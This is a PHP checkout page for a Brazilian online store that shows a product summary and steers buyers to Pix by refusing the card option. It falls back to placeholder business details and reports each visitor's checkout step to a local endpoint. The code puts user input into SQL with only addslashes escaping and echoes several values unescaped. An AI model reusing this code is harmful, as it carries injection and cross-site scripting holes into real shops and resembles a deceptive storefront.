<?php
session_start();
require_once("api/db.php");
require_once("api/facebook_pixel.php");

if (!isset($_GET["produto"])) {
    session_destroy();
    header("Location: ./index");
    exit();
} else {
    $id = addslashes($_GET["produto"]);
    $sqlx = mysqli_query($conn, "SELECT * from produto WHERE codigo='$id'");
    if(($sqlx ? mysqli_num_rows($sqlx) : 0) > 0){
        $sql = mysqli_query($conn, "SELECT * from config");
        $nome = "Minha Loja";
        $cor = "#ffe600";
        $cor_botao = "#3483fa";
        $endereco = "";
        $cnpj = "";
        while($sql && $row = mysqli_fetch_array($sql)){
            $cor = $row["cor"];
            $cor_botao = isset($row["cor_botao"]) ? $row["cor_botao"] : "#3483fa";
            $nome = $row["nome"];
            $endereco = isset($row["endereco"]) ? $row["endereco"] : "";
            $cnpj = isset($row["cnpj"]) ? $row["cnpj"] : "";
        }
        $sql1 = mysqli_query($conn, "SELECT * from produto WHERE codigo='$id'");
        while($sql1 && $row1 = mysqli_fetch_array($sql1)){
            $codigo = $row1["codigo"];
            $nomeproduto = $row1["nome"];
            $valor = $row1["valor"];
            $img = $row1["img"];
        }
        $_SESSION['session_payment'] = time() + 1000;
        $logo_files = glob("arquivos/logo/*.png");
        $logo_loja = !empty($logo_files) ? $logo_files[0] : "";
    } else {
        session_destroy();
        header("Location: ./index");
        exit();
    }
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Pagamento - <?php echo htmlspecialchars($nome); ?></title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
        :root {
            --store-yellow: <?php echo $cor; ?>;
            --store-blue: <?php echo $cor_botao; ?>;
            --store-bg-gray: #ebebeb;
            --store-text-dark: #333;
            --store-green: #00a650;
        }
        body { font-family: "Proxima Nova",-apple-system,Roboto,Arial,sans-serif; background-color: var(--store-bg-gray); color: var(--store-text-dark); -webkit-font-smoothing: antialiased; overflow-x: hidden; }

        /* Topo Original */
        header { background-color: var(--store-yellow); padding: 8px 16px; position: sticky; top: 0; z-index: 100; }
        .header-content-wrapper { max-width: 1200px; margin: 0 auto; }
        .header-full { display: flex; flex-direction: column; gap: 8px; }
        .header-top-row { display: flex; align-items: center; justify-content: space-between; }
        .header-logo-full { height: 40px; object-fit: contain; }
        .icon-btn { font-size: 20px; color: #fff; cursor: pointer; }
        .search-row { width: 100%; }
        .search-input-box { background: #fff; border-radius: 4px; padding: 8px 12px; display: flex; align-items: center; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
        .search-text { color: #999; font-size: 14px; }
        .location-bar { background: var(--store-yellow); padding: 8px 16px; display: flex; align-items: center; gap: 8px; font-size: 13px; color: #333; border-top: 1px solid rgba(0,0,0,0.05); }

        .container { width: 100%; max-width: 1200px; margin: 0 auto; padding: 12px; display: flex; flex-direction: column; gap: 12px; min-height: 60vh; }
        .card, .payment-section, .summary-section { max-width: 1200px; margin-left: auto; margin-right: auto; }

        /* ===== RESPONSIVIDADE DESKTOP ===== */
        @media (min-width: 1200px) {
            .container { flex-direction: row; padding: 30px 20px; align-items: flex-start; gap: 30px; max-width: 1200px; margin: 0 auto; }
            .payment-section { flex: 2; max-width: calc(66.666% - 15px); }
            .summary-section { flex: 1; position: sticky; top: 140px; max-width: calc(33.333% - 15px); }
            .card { border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); max-width: 100%; }
        }

        /* ===== RESPONSIVIDADE TABLET ===== */
        @media (min-width: 769px) and (max-width: 1199px) {
            .container { flex-direction: row; padding: 20px 16px; align-items: flex-start; gap: 20px; }
            .payment-section { flex: 2; }
            .summary-section { flex: 1; position: sticky; top: 120px; }
        }

        /* ===== RESPONSIVIDADE MOBILE ===== */
        @media (max-width: 768px) {
            .container { flex-direction: column; padding: 12px 0; }
            .payment-section { flex: 1; }
            .summary-section { flex: 1; width: 100%; position: static; }
            .card { margin: 0 0 8px 0; border-radius: 0; }
            .payment-option { padding: 16px; margin-bottom: 10px; }
            .payment-icon { width: 36px; height: 36px; font-size: 20px; }
            .payment-name { font-size: 14px; }
            .btn-finish { height: 44px; font-size: 15px; margin: 16px 12px 0; width: calc(100% - 24px); }
        }

        @media (max-width: 480px) {
            .container { padding: 8px 0; }
            .card { padding: 12px; }
            .section-title { font-size: 16px; margin-bottom: 16px; }
            .payment-option { padding: 12px; margin-bottom: 8px; }
            .payment-icon { width: 32px; height: 32px; font-size: 18px; }
            .payment-name { font-size: 13px; }
            .payment-desc { font-size: 12px; }
            .btn-finish { height: 42px; font-size: 14px; margin: 12px 10px 0; width: calc(100% - 20px); }
            .summary-img { width: 50px; height: 50px; }
            .summary-name { font-size: 12px; }
            .summary-row { font-size: 13px; }
        }

        .card { background: #fff; border-radius: 4px; padding: 16px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); width: 100%; }
        .section-title { font-size: 18px; font-weight: 600; margin-bottom: 20px; }

        .payment-option { display: flex; align-items: center; gap: 15px; padding: 20px; border: 1px solid #eee; border-radius: 8px; cursor: pointer; margin-bottom: 12px; transition: all 0.2s; }
        .payment-option:hover { border-color: var(--store-blue); background: #f9f9f9; }
        .payment-option.active { border-color: var(--store-blue); background: #f0f5ff; border-width: 2px; }
        .payment-icon { width: 40px; height: 40px; display: flex; align-items: center; justify-content: center; font-size: 24px; color: #333; }
        .payment-info { flex: 1; }
        .payment-name { font-size: 16px; font-weight: 600; margin-bottom: 2px; }
        .payment-desc { font-size: 13px; color: #666; }

        .btn-finish { display: flex; align-items: center; justify-content: center; width: 100%; height: 48px; background: var(--store-blue); color: #fff; border-radius: 6px; font-weight: 600; font-size: 16px; border: none; cursor: pointer; margin-top: 20px; }

        /* Resumo do Produto */
        .summary-item { display: flex; gap: 12px; padding-bottom: 15px; border-bottom: 1px solid #eee; margin-bottom: 15px; }
        .summary-img { width: 60px; height: 60px; object-fit: contain; }
        .summary-info { flex: 1; }
        .summary-name { font-size: 14px; line-height: 1.3; color: #333; }
        .summary-row { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 14px; color: #666; }
        .summary-total { display: flex; justify-content: space-between; margin-top: 15px; padding-top: 15px; border-top: 1px solid #eee; font-size: 18px; font-weight: 600; color: #333; }

        /* Rodapé Padronizado */
        .footer { background: #fff; color: #666; font-size: 12px; padding: 18px 16px 22px; border-top: 1px solid #ddd; margin-top: 40px; }
        .footer-inner { max-width: 1200px; margin: 0 auto; }
        .footer-title { margin-bottom: 12px; font-size: 14px; color: #333; }
        .footer-links { display: flex; flex-wrap: wrap; gap: 12px; margin-bottom: 12px; }
        .footer-links a { color: #333; text-decoration: none; }
    </style>
    <?php echo fb_pixel_base_code(); ?>

    <link rel="shortcut icon" href="arquivos/favicon.png?v=<?php echo time(); ?>">
    <link rel="icon" type="image/png" href="arquivos/favicon.png?v=<?php echo time(); ?>">
</head>
<body>
    <header class="store-header-container checkout-header-simple">
      <div class="header-content-wrapper">
        <div style="display: flex; align-items: center; justify-content: center; padding: 12px 0;">
          <?php if(!empty($logo_loja)): ?>
            <img src="<?php echo $logo_loja; ?>" alt="<?php echo $nome; ?>" class="header-logo-full" style="max-height: 40px; object-fit: contain;">
          <?php else: ?>
            <span style="font-weight: bold; font-size: 18px;"><?php echo $nome; ?></span>
          <?php endif; ?>
        </div>
      </div>
    </header>

    <div class="container">
        <div class="payment-section">
            <div class="card">
                <h2 class="section-title">Como você prefere pagar?</h2>

                <div class="payment-option active" onclick="selectMethod('pix', this)">
                    <div class="payment-icon"><i class="fa-brands fa-pix" style="color: #32bcad;"></i></div>
                    <div class="payment-info">
                        <div class="payment-name">Pix</div>
                        <div class="payment-desc">Aprovação imediata e frete mais rápido.</div>
                    </div>
                    <div class="payment-radio"><i class="fa-solid fa-circle-check" style="color: var(--store-blue);"></i></div>
                </div>

                <div class="payment-option" onclick="selectMethod('cartao', this)">
                    <div class="payment-icon"><i class="fa-solid fa-credit-card" style="color: #666;"></i></div>
                    <div class="payment-info">
                        <div class="payment-name">Cartão de Crédito</div>
                        <div class="payment-desc">Pague em até 12x sem juros.</div>
                    </div>
                    <div class="payment-radio"><i class="fa-regular fa-circle" style="color: #ccc;"></i></div>
                </div>
            </div>
        </div>

        <div class="summary-section">
            <div class="card">
                <div class="section-title">Resumo da compra</div>
                <div class="summary-item">
                    <?php $img_src = (strpos($img, 'http') === 0) ? $img : "./arquivos/produtos/$codigo/$img"; ?>
                    <img src="<?php echo $img_src; ?>" class="summary-img">
                    <div class="summary-info">
                        <div class="summary-name"><?php echo htmlspecialchars($nomeproduto); ?></div>
                    </div>
                </div>
                <div class="summary-row">
                    <span id="labelProdutos">Produtos (1)</span>
                    <span id="subtotalPrice">R$ 0,00</span>
                </div>
                <div class="summary-row">
                    <span>Frete</span>
                    <span style="color: #00a650;">Grátis</span>
                </div>
                <div class="summary-total">
                    <span>Total</span>
                    <span id="totalPrice">R$ 0,00</span>
                </div>
                <button class="btn-finish" onclick="finish()">Confirmar pagamento</button>
            </div>
        </div>
    </div>

    <footer class="footer-main">
      <div class="footer-content">
        <div class="footer-top">
          <div class="footer-links-container">
            <a href="politica-de-privacidade" class="footer-link">Política de Privacidade</a>
            <a href="termos-de-uso" class="footer-link">Termos de Uso</a>
            <a href="trocas-e-devolucoes" class="footer-link">Trocas e Devoluções</a>
            <a href="https://api.whatsapp.com/send?phone=<?php echo isset($numerozap) ? $numerozap : ''; ?>&text=<?php echo isset($textozap) ? urlencode($textozap) : ''; ?>" class="footer-link">Contato</a>
          </div>
        </div>
        <div class="footer-bottom">
          <p class="footer-copyright">Copyright © <?php echo date('Y'); ?> <?php echo htmlspecialchars($nome); ?>. Todos os direitos reservados.</p>
          <p class="footer-info">CNPJ: <?php echo !empty($cnpj) ? htmlspecialchars($cnpj) : "00.000.000/0001-00"; ?> | Endereço: <?php echo !empty($endereco) ? htmlspecialchars($endereco) : "Av. Paulista, 1000 - São Paulo, SP"; ?></p>
        </div>
      </div>
    </footer>
    <style>
    .footer-main {
      background-color: #f5f5f5;
      border-top: 1px solid #e0e0e0;
      padding: 40px 20px 30px;
      margin-top: 60px;
      font-family: "Montserrat", "Proxima Nova", "Helvetica Neue", Helvetica, Arial, sans-serif;
    }
    .footer-content {
      max-width: 1200px;
      margin: 0 auto;
    }
    .footer-top {
      margin-bottom: 30px;
    }
    .footer-links-container {
      display: flex;
      flex-wrap: wrap;
      gap: 20px;
      margin-bottom: 25px;
      justify-content: center;
    }
    .footer-link {
      display: inline-block;
      font-size: 13px;
      color: #666;
      text-decoration: none;
      transition: color 0.2s ease;
    }
    .footer-link:hover {
      color: #3483fa;
    }
    .footer-bottom {
      border-top: 1px solid #ddd;
      padding-top: 20px;
      text-align: center;
    }
    .footer-copyright {
      font-size: 13px;
      color: #666;
      font-weight: 400;
      margin-bottom: 8px;
    }
    .footer-info {
      font-size: 12px;
      color: #999;
      font-weight: 400;
      line-height: 1.4;
      margin: 0;
    }
    @media (max-width: 768px) {
      .footer-main {
        padding: 30px 15px 20px;
        margin-top: 40px;
      }
      .footer-links-container {
        gap: 12px;
        justify-content: center;
      }
      .footer-link {
        font-size: 12px;
        display: inline-block;
      }
      .footer-copyright {
        font-size: 12px;
        text-align: center;
      }
      .footer-info {
        font-size: 11px;
        text-align: center;
      }
    }
    @media (max-width: 480px) {
      .footer-links-container {
        gap: 8px;
        flex-direction: column;
        align-items: center;
      }
      .footer-link {
        font-size: 11px;
        display: block;
        margin-bottom: 4px;
      }
      .footer-copyright {
        font-size: 11px;
        text-align: center;
      }
      .footer-info {
        font-size: 10px;
        text-align: center;
      }
    }
    </style>

    <script>
        let selectedMethod = 'pix';

        function selectMethod(method, el) {
            selectedMethod = method;
            $('.payment-option').removeClass('active');
            $('.payment-radio i').removeClass('fa-circle-check').addClass('fa-regular fa-circle').css('color', '#ccc');
            $(el).addClass('active');
            $(el).find('.payment-radio i').removeClass('fa-regular fa-circle').addClass('fa-solid fa-circle-check').css('color', 'var(--store-blue)');
        }

        function finish() {
            if (selectedMethod === 'pix') {
                // Adicionar spinner e desativar botão para evitar cliques duplos
                $('.btn-finish').prop('disabled', true).html('<i class="fa-solid fa-spinner fa-spin"></i> Processando seu pedido...');

                // Pequeno delay visual para o spinner aparecer antes do redirecionamento
                setTimeout(function(){
                    window.location.href = 'success' + window.location.search;
                }, 500);
            } else {
                alert('Por favor, utilize o Pix para aprovação imediata no momento.');
            }
        }

        $(document).ready(function(){
            const data = JSON.parse(localStorage.getItem('lojavirtual') || '{}');
            if(data.precoFinal) {
                $('#labelProdutos').text(`Produtos (${data.quantos || 1})`);
                $('#subtotalPrice').text('R$ ' + data.precoFinal);
                $('#totalPrice').text('R$ ' + data.precoFinal);
            }

            sendOnline('payment');
            setInterval(function(){ sendOnline('payment'); }, 15000);
        });

        function sendOnline(etapa) {
            const payload = btoa(unescape(encodeURIComponent(JSON.stringify({
                api: 'online',
                etapa: etapa,
                dispositivo: /Android|iPhone/i.test(navigator.userAgent) ? 'mobile' : 'desktop'
            }))));
            $.post('api/', { p: payload });
        }
    </script>
</body>
</html>


